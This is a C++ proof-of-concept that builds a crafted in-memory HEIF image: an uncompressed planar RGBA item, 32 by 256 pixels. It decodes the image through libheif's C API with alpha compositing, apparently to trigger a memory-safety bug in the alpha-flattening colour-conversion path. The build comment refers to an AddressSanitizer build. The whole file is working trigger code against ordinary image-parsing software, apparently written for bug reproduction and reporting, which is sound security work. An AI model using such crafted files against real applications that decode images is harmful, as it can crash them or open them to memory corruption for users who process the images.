// Standalone PoC driven entirely through libheif's public C API.
//
// Builds an in-memory HEIF file holding a single uncompressed ('unci') item:
// planar RGBA, 4:4:4, every component 8 bit, non-square (32 x 256). The file is
// read back and decoded to a planar RGB 4:4:4 target while compositing the alpha
// plane onto a solid background. That decode path runs
// Op_flatten_alpha_plane::convert_colorspace, which allocates the output R/G/B
// planes and then composites the alpha plane into them.
//
// Build & run (links against the ASan-instrumented libheif in build-asan):
//   c++ -fsanitize=address -g -I . -I build-asan pocs/newbug.cc \
//       -o /tmp/newbug build-asan/libheif/libheif.so && \
//   LD_LIBRARY_PATH=build-asan/libheif /tmp/newbug

#include <cstdint>
#include <cstdio>
#include <cstdlib>
#include <vector>

#include "libheif/heif.h"

namespace {

void put_u32_be(std::vector<uint8_t>& out, uint32_t v) {
  out.push_back(static_cast<uint8_t>(v >> 24));
  out.push_back(static_cast<uint8_t>(v >> 16));
  out.push_back(static_cast<uint8_t>(v >> 8));
  out.push_back(static_cast<uint8_t>(v));
}

void put_u16_be(std::vector<uint8_t>& out, uint16_t v) {
  out.push_back(static_cast<uint8_t>(v >> 8));
  out.push_back(static_cast<uint8_t>(v));
}

void append_fourcc(std::vector<uint8_t>& out, const char fourcc[4]) {
  out.insert(out.end(), fourcc, fourcc + 4);
}

void append_cstr(std::vector<uint8_t>& out, const char* s) {
  while (*s) out.push_back(static_cast<uint8_t>(*s++));
  out.push_back(0);
}

void append(std::vector<uint8_t>& out, const std::vector<uint8_t>& v) {
  out.insert(out.end(), v.begin(), v.end());
}

std::vector<uint8_t> make_box(const char fourcc[4], const std::vector<uint8_t>& payload,
                              bool is_full_box = false, uint8_t version = 0, uint32_t flags = 0) {
  const size_t header_size = is_full_box ? 12 : 8;
  std::vector<uint8_t> box;
  put_u32_be(box, static_cast<uint32_t>(header_size + payload.size()));
  append_fourcc(box, fourcc);
  if (is_full_box) {
    box.push_back(version);
    box.push_back(static_cast<uint8_t>(flags >> 16));
    box.push_back(static_cast<uint8_t>(flags >> 8));
    box.push_back(static_cast<uint8_t>(flags));
  }
  append(box, payload);
  return box;
}

constexpr uint32_t WIDTH = 32;
constexpr uint32_t HEIGHT = 256;

// A minimal HEIF file with one 'unci' item: planar RGBA, 4:4:4, all 8-bit.
std::vector<uint8_t> build_file() {
  std::vector<uint8_t> ftyp_payload;
  append_fourcc(ftyp_payload, "mif1");
  put_u32_be(ftyp_payload, 0);
  append_fourcc(ftyp_payload, "mif1");
  append_fourcc(ftyp_payload, "heic");
  auto ftyp = make_box("ftyp", ftyp_payload);

  std::vector<uint8_t> hdlr_payload;
  put_u32_be(hdlr_payload, 0);
  append_fourcc(hdlr_payload, "pict");
  put_u32_be(hdlr_payload, 0);
  put_u32_be(hdlr_payload, 0);
  put_u32_be(hdlr_payload, 0);
  hdlr_payload.push_back(0);
  auto hdlr = make_box("hdlr", hdlr_payload, true);

  std::vector<uint8_t> pitm_payload;
  put_u16_be(pitm_payload, 1);
  auto pitm = make_box("pitm", pitm_payload, true);

  std::vector<uint8_t> infe_payload;
  put_u16_be(infe_payload, 1);
  put_u16_be(infe_payload, 0);
  append_fourcc(infe_payload, "unci");
  append_cstr(infe_payload, "");
  auto infe = make_box("infe", infe_payload, true, 2);

  std::vector<uint8_t> iinf_payload;
  put_u16_be(iinf_payload, 1);
  append(iinf_payload, infe);
  auto iinf = make_box("iinf", iinf_payload, true);

  std::vector<uint8_t> ispe_payload;
  put_u32_be(ispe_payload, WIDTH);
  put_u32_be(ispe_payload, HEIGHT);
  auto ispe = make_box("ispe", ispe_payload, true);

  std::vector<uint8_t> cmpd_payload;
  put_u32_be(cmpd_payload, 4);
  put_u16_be(cmpd_payload, 4); // red
  put_u16_be(cmpd_payload, 5); // green
  put_u16_be(cmpd_payload, 6); // blue
  put_u16_be(cmpd_payload, 7); // alpha
  auto cmpd = make_box("cmpd", cmpd_payload);

  const uint8_t depths[4] = {8, 8, 8, 8}; // R, G, B, Alpha
  std::vector<uint8_t> uncC_payload;
  put_u32_be(uncC_payload, 0); // profile
  put_u32_be(uncC_payload, 4); // component_count
  for (uint16_t idx = 0; idx < 4; idx++) {
    put_u16_be(uncC_payload, idx);
    uncC_payload.push_back(static_cast<uint8_t>(depths[idx] - 1));
    uncC_payload.push_back(0);
    uncC_payload.push_back(0);
  }
  uncC_payload.push_back(0);   // sampling_type = 4:4:4
  uncC_payload.push_back(0);   // interleave_type = component (planar)
  uncC_payload.push_back(0);   // block_size
  uncC_payload.push_back(0);   // flags
  put_u32_be(uncC_payload, 0); // pixel_size
  put_u32_be(uncC_payload, 0); // row_align_size
  put_u32_be(uncC_payload, 0); // tile_align_size
  put_u32_be(uncC_payload, 0); // num_tile_cols_minus_one
  put_u32_be(uncC_payload, 0); // num_tile_rows_minus_one
  auto uncC = make_box("uncC", uncC_payload, true);

  std::vector<uint8_t> ipco_payload;
  append(ipco_payload, ispe);
  append(ipco_payload, cmpd);
  append(ipco_payload, uncC);
  auto ipco = make_box("ipco", ipco_payload);

  std::vector<uint8_t> ipma_payload;
  put_u32_be(ipma_payload, 1);
  put_u16_be(ipma_payload, 1);
  ipma_payload.push_back(3);
  ipma_payload.push_back(0x80 | 1);
  ipma_payload.push_back(0x80 | 2);
  ipma_payload.push_back(0x80 | 3);
  auto ipma = make_box("ipma", ipma_payload, true);

  std::vector<uint8_t> iprp_payload;
  append(iprp_payload, ipco);
  append(iprp_payload, ipma);
  auto iprp = make_box("iprp", iprp_payload);

  // Planar tile data: R, G, B, Alpha, each 1 byte/sample. Alpha is near-maximum.
  std::vector<uint8_t> tile_data;
  for (uint32_t y = 0; y < HEIGHT; y++)
    for (uint32_t x = 0; x < WIDTH; x++)
      tile_data.push_back(static_cast<uint8_t>(0x40 + ((x + y) & 0x3f)));
  for (uint32_t y = 0; y < HEIGHT; y++)
    for (uint32_t x = 0; x < WIDTH; x++)
      tile_data.push_back(static_cast<uint8_t>(0x60 + ((x + y) & 0x3f)));
  for (uint32_t y = 0; y < HEIGHT; y++)
    for (uint32_t x = 0; x < WIDTH; x++)
      tile_data.push_back(static_cast<uint8_t>(0x20 + ((x + y) & 0x3f)));
  for (uint32_t y = 0; y < HEIGHT; y++)
    for (uint32_t x = 0; x < WIDTH; x++)
      tile_data.push_back(0xF0);
  auto idat = make_box("idat", tile_data);

  std::vector<uint8_t> iloc_payload;
  put_u16_be(iloc_payload, (4 << 12) | (4 << 8) | (0 << 4) | 0);
  put_u16_be(iloc_payload, 1);
  put_u16_be(iloc_payload, 1);
  put_u16_be(iloc_payload, 0x0001);
  put_u16_be(iloc_payload, 0);
  put_u16_be(iloc_payload, 1);
  put_u32_be(iloc_payload, 0);
  put_u32_be(iloc_payload, static_cast<uint32_t>(tile_data.size()));
  auto iloc = make_box("iloc", iloc_payload, true, 1);

  std::vector<uint8_t> meta_payload;
  append(meta_payload, hdlr);
  append(meta_payload, pitm);
  append(meta_payload, iinf);
  append(meta_payload, iprp);
  append(meta_payload, iloc);
  append(meta_payload, idat);
  auto meta = make_box("meta", meta_payload, true);

  std::vector<uint8_t> file;
  append(file, ftyp);
  append(file, meta);
  return file;
}

} // namespace

int main() {
  std::vector<uint8_t> file = build_file();

  heif_context* ctx = heif_context_alloc();
  if (!ctx) { fprintf(stderr, "alloc failed\n"); return 2; }

  heif_error err = heif_context_read_from_memory_without_copy(ctx, file.data(), file.size(), nullptr);
  if (err.code != heif_error_Ok) { fprintf(stderr, "read failed: %s\n", err.message); return 2; }

  heif_image_handle* handle = nullptr;
  err = heif_context_get_primary_image_handle(ctx, &handle);
  if (err.code != heif_error_Ok || !handle) { fprintf(stderr, "handle failed: %s\n", err.message); return 2; }

  heif_decoding_options* options = heif_decoding_options_alloc();
  heif_color_conversion_options_ext* ext = heif_color_conversion_options_ext_alloc();
  ext->alpha_composition_mode = heif_alpha_composition_mode_solid_color;
  ext->background_red = 0xFFFF;
  ext->background_green = 0xFFFF;
  ext->background_blue = 0xFFFF;
  options->color_conversion_options_ext = ext;

  // Decode to planar RGB 4:4:4 with alpha compositing. The flatten operator
  // allocates the output R/G/B planes and composites the alpha plane into them.
  heif_image* img = nullptr;
  err = heif_decode_image(handle, &img, heif_colorspace_RGB, heif_chroma_444, options);
  fprintf(stderr, "decode returned: %s\n", err.message);
  if (img) heif_image_release(img);

  heif_color_conversion_options_ext_free(ext);
  heif_decoding_options_free(options);
  heif_image_handle_release(handle);
  heif_context_free(ctx);
  return 0;
}
